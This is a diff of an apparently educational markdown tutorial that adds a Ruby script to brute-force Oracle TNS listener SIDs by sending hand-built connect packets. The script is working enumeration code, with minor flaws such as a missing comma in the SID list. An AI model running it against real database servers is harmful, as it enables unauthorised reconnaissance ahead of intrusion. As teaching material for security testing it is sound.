@@ -133,7 +133,91 @@ end
 Now we have everything to send our packet, let's to build a simple tns brute force to enumerate the exist tns listeners. The default behavior for oracle 11g is to reply with nothing if listener exist, and reply with error if it doesn't, the error similar to this `g"[(DESCRIPTION=(TMP=)(VSNNUM=186647040)(ERR=12505)(ERROR_STACK=(ERROR=(CODE=12505)(EMFI=4))))`.
 
 ### SID Brute force
-```
+```ruby
+#!/usr/bin/env ruby
+# -*- coding: binary -*-
+require 'socket'
+
+host = ARGV[0] || 'localhost'
+port = ARGV[1] || 1521
+
+
+#
+# Build TNS Packet
+#
+def tns_packet(connect_data)
+  
+  #=> Transparent Network Substrate Protocol
+  # Packet Length
+  pkt =  [58 + connect_data.length].pack('n')
+  # Packet Checksum
+  pkt << "\x00\x00"
+  # Packet Type: Connect(1)
+  pkt << "\x01"
+  # Reserved Byte
+  pkt << "\x00"
+  # Header Checksum
+  pkt << "\x00\x00"
+  #=> Connect
+  # Version
+  pkt << "\x01\x36"
+  # Version (Compatible)
+  pkt << "\x01\x2C"
+  # Service Options
+  pkt << "\x00\x00"
+  # Session Data Unit Size
+  pkt << "\x08\x00"
+  # Maximum Transmission Data Unit Size
+  pkt << "\xFF\xFF"
+  # NT Protocol Characteristics
+  pkt << "\x7F\x08"
+  # Line Turnaround Value
+  pkt << "\x00\x00"
+  # Value of 1 in Hardware
+  pkt << "\x00\x01"
+  # Length of Connect Data
+  pkt << [connect_data.length].pack('n')
+  # Offset to Connect Data
+  pkt << "\x00\x3A"
+  # Maximum Receivable Connect Data
+  pkt << "\x00\x00\x00\x00"
+  # Connect Flags 0
+  pkt << "\x00"
+  # Connect Flags 1
+  pkt << "\x00"
+  # Trace Cross Facility Item 1
+  pkt << "\x00\x00\x00\x00"
+  # Trace Cross Facility Item 2
+  pkt << "\x00\x00\x00\x00"
+  # Trace Unique Connection ID
+  pkt << "\x00\x00\x34\xE6\x00\x00\x00\x01"
+  # Connect Data
+  pkt << "\x00\x00\x00\x00\x00\x00\x00\x00"
+  pkt << connect_data
+
+  return pkt
+
+end
+
+#
+# SID Requst Data
+#
+def sid_request(sid,host, port)
+  connect_data = "(DESCRIPTION=(CONNECT_DATA=(SID=#{sid})(CID=(PROGRAM=)(HOST=__jdbc__)(USER=)))(ADDRESS=(PROTOCOL=tcp)(HOST=#{host})(PORT=#{port})))"
+  pkt = tns_packet(connect_data)
+end
+
+
+sids = [ 'N00TEXIST', 'PLSExtProc', 'ORACLE', 'ORA', 'ORA1', 'ORA2', 'XE', 'SOA', 'SOA1', 'SOA2', 'DBA1', 'DBA2' 'HR', 'HR1', 'HR2','SAP', 'TEST']
+
+s = TCPSocket.new host, port.to_i
+sids.each do |sid|
+  s.send sid_request(sid, host, port), 0
+  response = s.recv(100)
+  puts "[+] Found SID: " + sid if response.scan(/ERROR/).empty?
+  sleep 0.5
+end
+s.close
 
 ```
 
